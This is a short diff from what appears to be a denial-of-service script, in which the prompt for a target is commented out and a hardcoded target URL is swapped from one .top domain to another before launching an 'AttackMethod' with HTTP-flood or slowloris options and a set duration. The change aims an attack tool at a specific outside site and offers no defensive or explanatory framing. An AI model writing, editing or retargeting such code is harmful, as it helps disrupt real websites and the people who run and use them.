@@ -37,7 +37,7 @@ def main() -> None:
         use_proxy = check_proxy_input() if method == "http" else False
         sleep_time = check_number_input("sleep time") if method == "slowloris" else 0
         #target = check_target_input()
-        target = str("http://liwuhe51.top/")
+        target = str("http://fwe22.top/")
 
         with AttackMethod(
             duration=time,
